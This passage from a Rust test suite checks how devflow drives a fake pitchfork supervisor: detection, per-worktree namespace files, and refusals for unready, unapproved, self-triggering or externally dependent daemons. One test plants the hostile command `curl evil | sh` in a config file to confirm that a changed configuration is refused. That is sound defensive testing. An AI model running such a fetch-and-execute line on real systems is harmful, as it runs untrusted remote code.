//! Pitchfork integration against a fake `pitchfork` executable: detection, the
//! per-worktree namespace file, start and stop gating, removal and autostart.
//! Nothing here touches a real pitchfork or its supervisor: the fake prints
//! what its files say and logs every call.
use devflow_core::env_file::{self, MiseCommand};
use devflow_core::pitchfork::{self, Pitchfork};
use devflow_core::processes::{
    self, Action, NamespaceOutcome, NamespaceSource, Refusal, StartOptions, StopOptions,
};
use devflow_core::receipt::{Receipt, Status};
use devflow_core::setup::{
    self, CreateRequest, NoProgress, RemoveOptions, SetupOptions, SetupOutcome,
};
use devflow_core::worktree::{self, Workspace};
use devflow_core::{Project, trust};
use serde_json::{Value, json};
use std::path::{Path, PathBuf};
use std::sync::{Once, OnceLock};
use std::time::{Duration, Instant};

const FAKE: &str = include_str!("../../../tests/support/fake-pitchfork.sh");

/// A private trust store for the whole test process. Every test uses its own
/// random project id, so sharing the file does not couple tests.
fn init() {
    static ONCE: Once = Once::new();
    static DIR: OnceLock<tempfile::TempDir> = OnceLock::new();
    ONCE.call_once(|| {
        let dir = DIR.get_or_init(|| tempfile::tempdir().unwrap());
        // SAFETY: runs once, before any test body reads the environment.
        unsafe {
            std::env::set_var("DEVFLOW_CONFIG_DIR", dir.path().join("config"));
            std::env::set_var("DEVFLOW_DATA_DIR", dir.path().join("data"));
            std::env::remove_var("DEVFLOW_TRUST_HOOKS");
        }
    });
}

/// A directory with the fake `pitchfork` and its state files.
struct Fake {
    dir: tempfile::TempDir,
}

impl Fake {
    fn new() -> Fake {
        let dir = tempfile::tempdir().unwrap();
        let script = dir.path().join("pitchfork");
        std::fs::write(&script, FAKE).unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        Fake { dir }
    }

    fn pitchfork(&self) -> Pitchfork {
        Pitchfork::at(self.dir.path().join("pitchfork"))
    }

    /// A stand-in mise that hands processes started in `ws` exactly its
    /// `.devflow/env` (what `mise env --json` prints when the wiring works).
    fn mise_for(&self, ws: &Workspace) -> MiseCommand {
        let vars: serde_json::Map<String, Value> = env_file::read(&ws.path)
            .unwrap()
            .into_iter()
            .map(|(key, value)| (key, Value::String(value)))
            .collect();
        let file = self
            .dir
            .path()
            .join(format!("mise-env-{}.json", ws.name.replace('/', "-")));
        std::fs::write(&file, serde_json::to_string(&vars).unwrap()).unwrap();
        MiseCommand {
            program: "sh".into(),
            leading_args: vec!["-c".into(), "cat \"$0\"".into(), file.into()],
            ..MiseCommand::default()
        }
    }

    /// Default start options, with [`Fake::mise_for`] as mise.
    fn start_options(&self, ws: &Workspace) -> StartOptions {
        StartOptions {
            mise: self.mise_for(ws),
            ..StartOptions::default()
        }
    }

    fn set(&self, name: &str, content: &str) {
        std::fs::write(self.dir.path().join(name), content).unwrap();
    }

    fn json(&self, name: &str, value: &Value) {
        self.set(name, &serde_json::to_string(value).unwrap());
    }

    fn unset(&self, name: &str) {
        let _ = std::fs::remove_file(self.dir.path().join(name));
    }

    fn calls_log(&self) -> PathBuf {
        self.dir.path().join("calls.log")
    }

    /// `(cwd, arguments, auto-start env)` of every call.
    fn calls(&self) -> Vec<(String, String, String)> {
        std::fs::read_to_string(self.calls_log())
            .unwrap_or_default()
            .lines()
            .map(|line| {
                let mut parts = line.splitn(3, '|');
                (
                    parts.next().unwrap_or("").to_string(),
                    parts.next().unwrap_or("").to_string(),
                    parts.next().unwrap_or("").to_string(),
                )
            })
            .collect()
    }

    /// The arguments of the calls that start or stop something.
    fn mutations(&self) -> Vec<String> {
        self.calls()
            .into_iter()
            .map(|(_, args, _)| args)
            .filter(|args| args.starts_with("start") || args.starts_with("stop"))
            .collect()
    }

    fn clear_calls(&self) {
        let _ = std::fs::remove_file(self.calls_log());
    }
}

struct Repo {
    _dir: tempfile::TempDir,
    root: PathBuf,
    project: Project,
}

const WEB: &str = "[daemons.web]\nrun = \"bun run dev\"\nport = 3000\nmise = true\n";

fn commit_all(repo: &git2::Repository, message: &str) {
    let mut index = repo.index().unwrap();
    index
        .add_all(["*"], git2::IndexAddOption::DEFAULT, None)
        .unwrap();
    index.write().unwrap();
    let tree = repo.find_tree(index.write_tree().unwrap()).unwrap();
    let parent = repo.head().ok().and_then(|h| h.peel_to_commit().ok());
    let parents: Vec<_> = parent.iter().collect();
    let sig = git2::Signature::now("Test", "test@example.com").unwrap();
    repo.commit(Some("HEAD"), &sig, &sig, message, &tree, &parents)
        .unwrap();
}

/// A repository `shop` whose main checkout commits `devflow.toml` (`extra` is
/// appended) and, when given, `pitchfork.toml`.
fn repo(pitchfork_toml: Option<&str>, extra: &str) -> Repo {
    init();
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap().join("shop");
    std::fs::create_dir_all(&root).unwrap();
    let mut options = git2::RepositoryInitOptions::new();
    options.initial_head("main");
    let git = git2::Repository::init_opts(&root, &options).unwrap();
    std::fs::write(
        root.join("devflow.toml"),
        format!(
            "[project]\nname = \"shop\"\nid = \"{}\"\n\n{extra}\n",
            uuid::Uuid::new_v4()
        ),
    )
    .unwrap();
    if let Some(text) = pitchfork_toml {
        std::fs::write(root.join("pitchfork.toml"), text).unwrap();
    }
    std::fs::write(root.join("README.md"), "shop\n").unwrap();
    commit_all(&git, "initial");
    let project = Project::open(&root).unwrap();
    Repo {
        _dir: dir,
        root,
        project,
    }
}

fn create(project: &Project, name: &str) -> SetupOutcome {
    setup::create(
        project,
        CreateRequest {
            name: name.into(),
            from: None,
            options: SetupOptions::default(),
        },
        &mut NoProgress,
    )
    .unwrap()
}

/// A `ready` workspace; `approve` records the approval of its pitchfork files.
fn ready(t: &Repo, name: &str, approve: bool) -> Workspace {
    let out = create(&t.project, name);
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    if approve {
        approve_workspace(t, &out.workspace);
    }
    out.workspace
}

fn approve_workspace(t: &Repo, ws: &Workspace) {
    let scope = trust::scope_at(&t.project, &ws.path);
    trust::approve_scope_at(&t.project, &ws.path, &scope).unwrap();
}

fn namespace_of(t: &Repo, ws: &Workspace) -> String {
    setup::receipt(&t.project, ws).unwrap().unwrap().slug()
}

fn listed(ns: &str, name: &str, status: &str, pid: Option<u32>, port: Option<u16>) -> Value {
    json!({
        "id": format!("{ns}/{name}"), "namespace": ns, "name": name, "pid": pid,
        "status": status, "oneshot": false, "disabled": false,
        "available": status == "available", "proxy_url": null, "url": null,
        "error": null, "port": port.into_iter().collect::<Vec<_>>(),
    })
}

fn start(t: &Repo, fake: &Fake, ws: &Workspace) -> anyhow::Result<processes::ProcessReport> {
    processes::start_with(
        Some(&fake.pitchfork()),
        &t.project,
        ws,
        &fake.start_options(ws),
    )
}

fn refusal(error: &anyhow::Error) -> &Refusal {
    error
        .downcast_ref::<Refusal>()
        .unwrap_or_else(|| panic!("not a refusal: {error:#}"))
}

// --- detection ------------------------------------------------------------

#[test]
fn a_shim_that_exits_one_is_not_installed_even_though_it_is_executable() {
    let fake = Fake::new();
    fake.set("version_exit", "1");
    let detection = fake.pitchfork().detect();
    assert!(detection.path.is_some());
    assert!(!detection.installed && !detection.usable(), "{detection:?}");
    assert!(detection.version.is_none());
    assert!(
        detection
            .problem
            .as_deref()
            .is_some_and(|p| p.contains("No version is set for shim")),
        "{detection:?}"
    );
    assert!(
        detection.summary().contains("does not run"),
        "{}",
        detection.summary()
    );
    // Only `--version` was asked: no feature probing of a build that does not run.
    let calls = fake.calls();
    assert_eq!(calls.len(), 1, "{calls:?}");
    assert_eq!(calls[0].1, "--version");
}

#[test]
fn a_working_build_reports_its_version_and_every_feature() {
    let fake = Fake::new();
    let detection = fake.pitchfork().detect();
    assert!(detection.installed && detection.usable(), "{detection:?}");
    assert_eq!(detection.version.as_deref(), Some("2.29.0"));
    assert!(detection.missing_features.is_empty(), "{detection:?}");
    let asked: Vec<String> = fake.calls().into_iter().map(|c| c.1).collect();
    for expected in ["--version", "list --help", "proxy status --help"] {
        assert!(asked.contains(&expected.to_string()), "{asked:?}");
    }
}

#[test]
fn missing_features_are_named_and_make_the_build_unusable() {
    let fake = Fake::new();
    fake.set("missing", "proxy status --json\nlist --json\n");
    let detection = fake.pitchfork().detect();
    assert!(detection.installed);
    assert!(!detection.usable());
    assert_eq!(
        detection.missing_features,
        ["list --json", "proxy status --json"]
    );
    assert!(
        detection
            .summary()
            .contains("lacks list --json, proxy status --json"),
        "{}",
        detection.summary()
    );
}

#[test]
fn a_build_before_namespaced_ids_cannot_start_or_stop_by_id() {
    // pitchfork 1.x has no namespace in a daemon id: `start ns/name` does not
    // mean what devflow needs, and `--local` is the only thing left, which
    // reaches the daemons of parent directories. Such a build is unusable.
    for version in ["1.6.0", "0.9.2", "garbled"] {
        let fake = Fake::new();
        fake.set("version", version);
        let detection = fake.pitchfork().detect();
        assert!(detection.installed && !detection.usable(), "{detection:?}");
        assert_eq!(
            detection.missing_features,
            [pitchfork::QUALIFIED_IDS],
            "{version}"
        );
        assert!(
            detection.summary().contains("namespace/name"),
            "{}",
            detection.summary()
        );
    }
    let fake = Fake::new();
    for version in ["2.0.0", "2.25.0", "2.30.1", "3.1.0"] {
        fake.set("version", version);
        assert!(fake.pitchfork().detect().usable(), "{version}");
    }
}

#[test]
fn what_acts_on_pitchfork_needs_every_feature_and_not_only_a_version() {
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    for (what, setup) in [
        ("lacks list --json", ("missing", "list --json\n")),
        (
            "lacks proxy status --json",
            ("missing", "proxy status --json\n"),
        ),
        ("namespace/name", ("version", "1.6.0")),
    ] {
        // `--version` works in each of them; a build that runs is not enough.
        let fake = Fake::new();
        fake.set(setup.0, setup.1);
        assert!(fake.pitchfork().probe().installed);
        let not_available = |error: &anyhow::Error| match refusal(error) {
            Refusal::NotInstalled { detail } => {
                assert!(detail.contains(what), "{what}: {detail}");
            }
            other => panic!("{what}: {other:?}"),
        };
        not_available(&start(&t, &fake, &ws).unwrap_err());
        not_available(
            &processes::stop_with(
                Some(&fake.pitchfork()),
                &t.project,
                &ws,
                &StopOptions::default(),
            )
            .unwrap_err(),
        );
        not_available(
            &processes::restart_with(
                Some(&fake.pitchfork()),
                &t.project,
                &ws,
                &fake.start_options(&ws),
                &StopOptions::default(),
            )
            .unwrap_err(),
        );
        assert!(fake.mutations().is_empty(), "{what}: {:?}", fake.calls());
        // The gates a person sees say the same.
        let status = processes::status_with(Some(&fake.pitchfork()), &t.project, &ws);
        assert!(!status.installed, "{what}");
        for gate in [&status.can_start, &status.can_stop] {
            assert!(
                matches!(&gate.refusal, Some(Refusal::NotInstalled { detail }) if detail.contains(what)),
                "{what}: {gate:?}"
            );
        }
        // And it is not asked what runs of a build that cannot tell.
        assert!(
            fake.calls().iter().all(|c| !c.1.starts_with("list --json")),
            "{what}: {:?}",
            fake.calls()
        );
    }
}

#[test]
fn detection_is_remembered_for_a_moment_and_can_be_forgotten() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let helps = |fake: &Fake| fake.calls().iter().filter(|c| c.1 == "list --help").count();
    for _ in 0..3 {
        processes::status_with(Some(&fake.pitchfork()), &t.project, &ws);
    }
    assert_eq!(helps(&fake), 1, "one detection serves the refreshes");
    pitchfork::forget_detections();
    processes::status_with(Some(&fake.pitchfork()), &t.project, &ws);
    assert_eq!(helps(&fake), 2);
}

#[test]
fn a_missing_executable_is_not_installed() {
    let detection = Pitchfork::at("/nonexistent/pitchfork").detect();
    assert!(!detection.installed);
    assert!(detection.problem.is_some());
}

// --- the namespace file ----------------------------------------------------

fn local_file(ws: &Workspace) -> String {
    std::fs::read_to_string(ws.path.join("pitchfork.local.toml")).unwrap()
}

fn exclude_text(t: &Repo) -> String {
    std::fs::read_to_string(t.project.git_common_dir.join("info/exclude")).unwrap_or_default()
}

#[test]
fn the_namespace_is_written_during_setup_with_identity_only() {
    let t = repo(Some(WEB), "[env]\nSECRET_ISH = \"x\"\n");
    let out = setup::create(
        &t.project,
        CreateRequest {
            name: "feature/a".into(),
            from: None,
            options: SetupOptions::default(),
        },
        &mut NoProgress,
    )
    .unwrap();
    let ws = &out.workspace;
    let slug = out.receipt.slug();
    let text = local_file(ws);
    let dir_name = ws.path.file_name().unwrap().to_string_lossy().into_owned();
    // A marker comment, then exactly the two identity keys: no [env], no secret.
    let body: Vec<&str> = text
        .lines()
        .filter(|line| !line.starts_with('#') && !line.is_empty())
        .collect();
    assert_eq!(
        body,
        [
            format!("namespace = \"{slug}\""),
            format!("worktree_label = \"{dir_name}\"")
        ],
        "{text}"
    );
    assert!(text.starts_with("# Written by devflow"), "{text}");
    assert!(slug.starts_with("df-") && slug.len() == "df-".len() + 8 + 1 + 8);
    // It is the receipt's instance, and the project id's head.
    assert!(slug.contains(&t.project.id().simple().to_string()[..8]));
    // Excluded once, through the repository's info/exclude, so the worktree is clean.
    let exclude = exclude_text(&t);
    assert_eq!(
        exclude.matches("/pitchfork.local.toml").count(),
        1,
        "{exclude}"
    );
    assert!(
        !worktree::is_dirty(ws).unwrap(),
        "the file is not an untracked change"
    );
    // The namespace is what `namespace_of` reports.
    let namespace = processes::namespace_of(&ws.path);
    assert_eq!(namespace.value, slug);
    assert_eq!(namespace.source, NamespaceSource::Devflow);
    // The scope that was approved does not move because of it.
    let scope = trust::scope_at(&t.project, &ws.path);
    assert!(
        scope
            .processes
            .layers
            .iter()
            .all(|layer| layer.file != "pitchfork.local.toml"),
        "{:?}",
        scope.processes.layers
    );
}

#[test]
fn nothing_is_written_when_the_project_does_not_use_pitchfork() {
    let t = repo(None, "");
    let ws = create(&t.project, "plain").workspace;
    assert!(!ws.path.join("pitchfork.local.toml").exists());
    assert!(!exclude_text(&t).contains("pitchfork.local.toml"));
    let receipt = setup::receipt(&t.project, &ws).unwrap().unwrap();
    assert_eq!(
        processes::ensure_namespace(&t.project, &ws, &receipt),
        NamespaceOutcome::NotUsed
    );
}

#[test]
fn the_exclusion_is_added_once_and_keeps_what_was_there() {
    let t = repo(Some(WEB), "");
    let exclude = t.project.git_common_dir.join("info/exclude");
    std::fs::create_dir_all(exclude.parent().unwrap()).unwrap();
    // No trailing newline, as an editor may leave it.
    std::fs::write(&exclude, "# mine\n*.swp").unwrap();
    let a = create(&t.project, "a").workspace;
    let b = create(&t.project, "b").workspace;
    let text = exclude_text(&t);
    assert!(text.starts_with("# mine\n*.swp\n"), "{text}");
    assert_eq!(text.matches("pitchfork.local.toml").count(), 1, "{text}");
    // The main checkout's own file, and a second call, change nothing.
    let receipt = setup::receipt(&t.project, &a).unwrap().unwrap();
    for _ in 0..2 {
        processes::ensure_namespace(&t.project, &a, &receipt);
        processes::ensure_namespace(&t.project, &b, &receipt);
    }
    assert_eq!(exclude_text(&t), text);
    assert!(!processes::ensure_excluded(&t.project.git_common_dir).unwrap());
    // Both worktrees got their own namespace.
    assert_ne!(local_file(&a), local_file(&b));
}

#[test]
fn a_committed_namespace_is_reported_and_nothing_is_written() {
    let t = repo(
        Some("namespace = \"shop\"\n[daemons.web]\nrun = \"x\"\n"),
        "",
    );
    let out = create(&t.project, "feature");
    assert!(!out.workspace.path.join("pitchfork.local.toml").exists());
    assert!(!exclude_text(&t).contains("pitchfork.local.toml"));
    let warning = out
        .warnings
        .iter()
        .find(|w| w.contains("declares namespace"))
        .unwrap_or_else(|| panic!("{:?}", out.warnings));
    assert!(
        warning.contains("pitchfork.toml") && warning.contains("\"shop\""),
        "{warning}"
    );
    // Setup still finished: this is a note, not a failure.
    assert_eq!(out.status, Status::Ready);
    let outcome = processes::ensure_namespace(&t.project, &out.workspace, &out.receipt);
    assert_eq!(
        outcome,
        NamespaceOutcome::Conflict {
            file: "pitchfork.toml".into(),
            declared: "shop".into()
        }
    );
    let namespace = processes::namespace_of(&out.workspace.path);
    assert_eq!(namespace.value, "shop");
    assert_eq!(
        namespace.source,
        NamespaceSource::Declared {
            file: "pitchfork.toml".into()
        }
    );
    // doctor says so too.
    assert!(
        processes::namespace_problem(&out.workspace.path)
            .unwrap()
            .contains("declares namespace")
    );
    // The files give a namespace devflow did not assign: nothing is started
    // through it.
    let fake = Fake::new();
    let error = processes::start_with(
        Some(&fake.pitchfork()),
        &t.project,
        &out.workspace,
        &StartOptions::default(),
    )
    .unwrap_err();
    assert!(
        matches!(
            refusal(&error),
            Refusal::ForeignNamespace { expected, found, file }
                if *expected == out.receipt.slug()
                    && found == "shop"
                    && file.as_deref() == Some("pitchfork.toml")
        ),
        "{error:#}"
    );
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
    // A namespace in .config/ conflicts as well.
    let t = repo(Some(WEB), "");
    let ws = create(&t.project, "cfg").workspace;
    std::fs::remove_file(ws.path.join("pitchfork.local.toml")).unwrap();
    std::fs::create_dir_all(ws.path.join(".config")).unwrap();
    std::fs::write(
        ws.path.join(".config/pitchfork.local.toml"),
        "namespace = \"other\"\n",
    )
    .unwrap();
    let receipt = setup::receipt(&t.project, &ws).unwrap().unwrap();
    assert!(matches!(
        processes::ensure_namespace(&t.project, &ws, &receipt),
        NamespaceOutcome::Conflict { .. }
    ));
}

#[test]
fn a_hand_written_local_file_is_never_touched() {
    let t = repo(Some(WEB), "");
    let mine = "[daemons.web]\nrun = \"bun run mine\"\n";
    // Existing before setup.
    let hook = |ws: &Workspace| std::fs::write(ws.path.join("pitchfork.local.toml"), mine).unwrap();
    let ws = worktree::create(&t.project, "hand", None).unwrap();
    hook(&ws);
    let out = setup::setup(
        &t.project,
        &ws,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(local_file(&ws), mine);
    assert!(
        out.warnings
            .iter()
            .any(|w| w.contains("pitchfork.local.toml") && w.contains("left it alone")),
        "{:?}",
        out.warnings
    );
    assert!(
        !exclude_text(&t).contains("pitchfork.local.toml"),
        "nothing was written"
    );

    // A file devflow wrote that somebody then edited is theirs from then on.
    let ws2 = create(&t.project, "edited").workspace;
    let written = local_file(&ws2);
    let edited = format!("{written}[daemons.extra]\nrun = \"x\"\n");
    std::fs::write(ws2.path.join("pitchfork.local.toml"), &edited).unwrap();
    let receipt = setup::receipt(&t.project, &ws2).unwrap().unwrap();
    assert!(matches!(
        processes::ensure_namespace(&t.project, &ws2, &receipt),
        NamespaceOutcome::HandWritten { .. }
    ));
    assert_eq!(local_file(&ws2), edited);
    // A marker without the content that goes with it is not devflow's either.
    let forged = written.replace("df-", "xx-");
    std::fs::write(ws2.path.join("pitchfork.local.toml"), &forged).unwrap();
    assert!(matches!(
        processes::ensure_namespace(&t.project, &ws2, &receipt),
        NamespaceOutcome::HandWritten { .. }
    ));
    assert_eq!(local_file(&ws2), forged);
}

#[test]
fn a_changed_identity_rewrites_only_devflows_own_file() {
    let t = repo(Some(WEB), "");
    let ws = create(&t.project, "moved").workspace;
    let mut receipt = setup::receipt(&t.project, &ws).unwrap().unwrap();
    let before = local_file(&ws);
    assert!(matches!(
        processes::ensure_namespace(&t.project, &ws, &receipt),
        NamespaceOutcome::Current { .. }
    ));
    assert_eq!(local_file(&ws), before);
    // A new instance identity (setup --new-instance) means a new namespace.
    receipt.instance_id = uuid::Uuid::new_v4();
    let outcome = processes::ensure_namespace(&t.project, &ws, &receipt);
    assert!(
        matches!(outcome, NamespaceOutcome::Written { .. }),
        "{outcome:?}"
    );
    let after = local_file(&ws);
    assert_ne!(after, before);
    assert!(after.contains(&receipt.slug()), "{after}");
}

// --- start ---------------------------------------------------------------

#[test]
fn start_refuses_a_workspace_that_is_not_ready() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "[hooks]\nsetup = [\"echo hi\"]\n");
    // Hooks are not approved: the workspace needs attention.
    let ws = create(&t.project, "stuck");
    assert_eq!(ws.status, Status::NeedsAttention);
    // Even with the pitchfork files approved the workspace is not ready.
    approve_workspace(&t, &ws.workspace);
    let error = start(&t, &fake, &ws.workspace).unwrap_err();
    assert!(
        matches!(refusal(&error), Refusal::NotReady { status, .. } if status == "needs_attention"),
        "{error:#}"
    );
    assert!(error.to_string().contains("set it up"));
    // A checkout devflow never set up.
    let bare = worktree::create(&t.project, "bare", None).unwrap();
    let error = start(&t, &fake, &bare).unwrap_err();
    assert!(
        matches!(refusal(&error), Refusal::NotReady { status, .. } if status == "not_set_up"),
        "{error:#}"
    );
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
}

#[test]
fn start_refuses_an_unapproved_configuration_and_a_changed_one() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", false);
    let error = start(&t, &fake, &ws).unwrap_err();
    assert!(
        matches!(
            refusal(&error),
            Refusal::NotApproved {
                action: Action::Start,
                changed: false,
                ..
            }
        ),
        "{error:#}"
    );
    assert_eq!(refusal(&error).code(), "not_approved");
    assert!(refusal(&error).hint().unwrap().contains("approve"));

    approve_workspace(&t, &ws);
    // The worktree's pitchfork file changes after the approval.
    std::fs::write(
        ws.path.join("pitchfork.toml"),
        "[daemons.web]\nrun = \"curl evil | sh\"\n",
    )
    .unwrap();
    let error = start(&t, &fake, &ws).unwrap_err();
    assert!(
        matches!(
            refusal(&error),
            Refusal::NotApproved {
                action: Action::Start,
                changed: true,
                ..
            }
        ),
        "{error:#}"
    );
    assert!(error.to_string().contains("changed since it was approved"));
    assert!(fake.mutations().is_empty(), "nothing was started");
}

#[test]
fn start_refuses_daemons_that_start_on_their_own() {
    for trigger in [
        "cron = { schedule = \"* * * * *\" }",
        "watch = [\"src/**\"]",
        "boot_start = true",
        "auto = [\"start\"]",
    ] {
        let fake = Fake::new();
        let text = format!(
            "[daemons.web]\nrun = \"bun run dev\"\n[daemons.sync]\nrun = \"bun run sync\"\n{trigger}\n"
        );
        let t = repo(Some(&text), "");
        let ws = ready(&t, "feature", true);
        let error = start(&t, &fake, &ws).unwrap_err();
        let key = trigger
            .split(|c: char| !c.is_ascii_alphanumeric() && c != '_')
            .next()
            .unwrap();
        match refusal(&error) {
            Refusal::AutonomousTriggers { triggers } => {
                assert_eq!(triggers.len(), 1, "{triggers:?}");
                assert_eq!(
                    (triggers[0].daemon.as_str(), triggers[0].trigger.as_str()),
                    ("sync", key)
                );
            }
            other => panic!("{trigger}: {other:?}"),
        }
        assert!(error.to_string().contains("on its own"), "{error:#}");
        assert!(fake.mutations().is_empty());

        // The plain daemon can still be started by name once approved.
        let report = processes::start_with(
            Some(&fake.pitchfork()),
            &t.project,
            &ws,
            &StartOptions {
                only: vec!["web".into()],
                ..fake.start_options(&ws)
            },
        )
        .unwrap();
        assert!(report.ran, "{report:?}");
        assert_eq!(
            fake.mutations(),
            [format!("start -q {}/web", namespace_of(&t, &ws))]
        );
        // …but not the one with a trigger, nor what depends on it.
        let error = processes::start_with(
            Some(&fake.pitchfork()),
            &t.project,
            &ws,
            &StartOptions {
                only: vec!["sync".into()],
                ..fake.start_options(&ws)
            },
        )
        .unwrap_err();
        assert!(matches!(
            refusal(&error),
            Refusal::AutonomousTriggers { .. }
        ));
        let error = processes::start_with(
            Some(&fake.pitchfork()),
            &t.project,
            &ws,
            &StartOptions {
                only: vec!["nope".into()],
                ..fake.start_options(&ws)
            },
        )
        .unwrap_err();
        assert!(matches!(refusal(&error), Refusal::UnknownDaemon { .. }));
    }
}

#[test]
fn a_daemon_that_depends_on_one_with_a_trigger_is_not_a_plain_one() {
    let fake = Fake::new();
    let t = repo(
        Some(
            "[daemons.web]\nrun = \"a\"\ndepends = [\"sync\"]\n[daemons.sync]\nrun = \"b\"\nwatch = [\"x\"]\n",
        ),
        "",
    );
    let ws = ready(&t, "feature", true);
    let error = processes::start_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StartOptions {
            only: vec!["web".into()],
            ..fake.start_options(&ws)
        },
    )
    .unwrap_err();
    assert!(
        matches!(refusal(&error), Refusal::AutonomousTriggers { .. }),
        "{error:#}"
    );
}

/// Every call the fake saw that starts or stops something, with its arguments.
fn assert_never_local(fake: &Fake) {
    for (_, args, _) in fake.calls() {
        for option in ["--local", "-l", "--all", "-a", "--global", "-g", "--group"] {
            assert!(
                !args.split(' ').any(|word| word == option),
                "devflow never selects daemons by scope; saw `{args}`"
            );
        }
    }
}

#[test]
fn start_and_stop_name_the_workspaces_own_daemons_and_never_reach_a_parents() {
    let fake = Fake::new();
    let t = repo(
        Some("[daemons.web]\nrun = \"a\"\n[daemons.worker]\nrun = \"b\"\n"),
        "",
    );
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    // Another project's configuration further up the tree. pitchfork's
    // `--local` would select its daemons too, from this worktree.
    let parent = ws.path.parent().unwrap();
    std::fs::write(
        parent.join("pitchfork.toml"),
        "namespace = \"shop-worktrees\"\n[daemons.ancestor]\nrun = \"sleep 600\"\n",
    )
    .unwrap();
    fake.json(
        "list.json",
        &json!([
            listed(&ns, "web", "available", None, None),
            listed(&ns, "worker", "available", None, None),
            listed("shop-worktrees", "ancestor", "available", None, None),
        ]),
    );

    // Everything the workspace declares, by full id: nothing else.
    start(&t, &fake, &ws).unwrap();
    assert_eq!(fake.mutations(), [format!("start -q {ns}/web {ns}/worker")]);
    // Named daemons: just those.
    fake.clear_calls();
    processes::start_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StartOptions {
            only: vec!["worker".into()],
            ..fake.start_options(&ws)
        },
    )
    .unwrap();
    assert_eq!(fake.mutations(), [format!("start -q {ns}/worker")]);

    // Stop: the running daemons of this namespace by id; the ancestor's daemon
    // runs, and is left alone.
    fake.clear_calls();
    fake.json(
        "list.json",
        &json!([
            listed(&ns, "web", "running", Some(10), None),
            listed(&ns, "worker", "running", Some(11), None),
            listed("shop-worktrees", "ancestor", "running", Some(12), None),
        ]),
    );
    fake.json(
        "after_stop.json",
        &json!([
            listed(&ns, "web", "stopped", None, None),
            listed(&ns, "worker", "stopped", None, None),
            listed("shop-worktrees", "ancestor", "running", Some(12), None),
        ]),
    );
    let report = processes::stop_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StopOptions::default(),
    )
    .unwrap();
    assert!(report.ok(), "{report:?}");
    assert_eq!(fake.mutations(), [format!("stop {ns}/web {ns}/worker")]);
    assert_never_local(&fake);
}

#[test]
fn a_dependency_outside_the_workspace_refuses_the_start() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", false);
    let ns = namespace_of(&t, &ws);
    let write = |depends: &str| {
        std::fs::write(
            ws.path.join("pitchfork.toml"),
            format!("[daemons.web]\nrun = \"a\"\ndepends = {depends}\n[daemons.db]\nrun = \"b\"\n"),
        )
        .unwrap();
        approve_workspace(&t, &ws);
    };
    let attempt = |only: &[&str]| {
        processes::start_with(
            Some(&fake.pitchfork()),
            &t.project,
            &ws,
            &StartOptions {
                only: only.iter().map(|s| s.to_string()).collect(),
                ..fake.start_options(&ws)
            },
        )
    };
    // Another namespace (a parent project, another worktree, `global`), a name
    // only a parent could declare, and a malformed entry: all refused, whether
    // everything or just `web` is started, and nothing is started.
    for depends in [
        "[\"shop-worktrees/db\"]",
        "[\"global/db\"]",
        "[\"df-00000000-00000000/db\"]",
        "[\"cache\"]",
        "[\"a/b/c\"]",
    ] {
        write(depends);
        for only in [&[][..], &["web"][..]] {
            let error = attempt(only).unwrap_err();
            match refusal(&error) {
                Refusal::ExternalDependency { daemon, dependency } => {
                    assert_eq!(daemon, "web", "{depends}");
                    assert!(
                        depends.contains(dependency.as_str()),
                        "{depends}: {dependency}"
                    );
                }
                other => panic!("{depends} {only:?}: {other:?}"),
            }
            assert_eq!(refusal(&error).code(), "external_dependency");
            assert!(
                error.to_string().contains("outside the workspace"),
                "{error:#}"
            );
        }
    }
    assert!(fake.mutations().is_empty(), "{:?}", fake.mutations());
    // Started by name, `db` has no dependency: fine, whatever `web` says.
    let report = attempt(&["db"]).unwrap();
    assert!(report.ran, "{report:?}");
    assert_eq!(fake.mutations(), [format!("start -q {ns}/db")]);

    // A dependency on the workspace's own daemon, plain or qualified with its
    // own namespace, is what pitchfork resolves inside the workspace.
    fake.clear_calls();
    for depends in [
        "[\"db\"]".to_string(),
        format!("[\"{ns}/db\"]"),
        format!("[\"db\", \"{ns}/db\"]"),
    ] {
        write(&depends);
        attempt(&["web"]).unwrap();
        assert_eq!(
            fake.mutations().last().unwrap(),
            &format!("start -q {ns}/web"),
            "{depends}"
        );
    }
}

#[test]
fn a_replaced_definitions_dependencies_do_not_count() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", false);
    let ns = namespace_of(&t, &ws);
    std::fs::create_dir_all(ws.path.join(".config")).unwrap();
    let write = |lower: &str, higher: &str| {
        std::fs::write(ws.path.join(".config/pitchfork.toml"), lower).unwrap();
        std::fs::write(ws.path.join("pitchfork.toml"), higher).unwrap();
        approve_workspace(&t, &ws);
    };
    let attempt = |only: &[&str]| {
        processes::start_with(
            Some(&fake.pitchfork()),
            &t.project,
            &ws,
            &StartOptions {
                only: only.iter().map(|s| s.to_string()).collect(),
                ..fake.start_options(&ws)
            },
        )
    };
    let status = || processes::status_with(Some(&fake.pitchfork()), &t.project, &ws);

    // `.config/pitchfork.toml` defines `web` with a dependency outside the
    // workspace; `pitchfork.toml`, the higher layer, replaces `web` whole
    // without it. pitchfork starts the replacement alone (definitions replace
    // each other, they are not merged), so devflow starts it too.
    write(
        "[daemons.web]\nrun = \"a\"\ndepends = [\"global/db\"]\n",
        "[daemons.web]\nrun = \"b\"\n",
    );
    assert!(status().can_start.allowed, "{:?}", status().can_start);
    assert!(status().daemons.iter().all(|d| d.startable));
    for only in [&[][..], &["web"][..]] {
        fake.clear_calls();
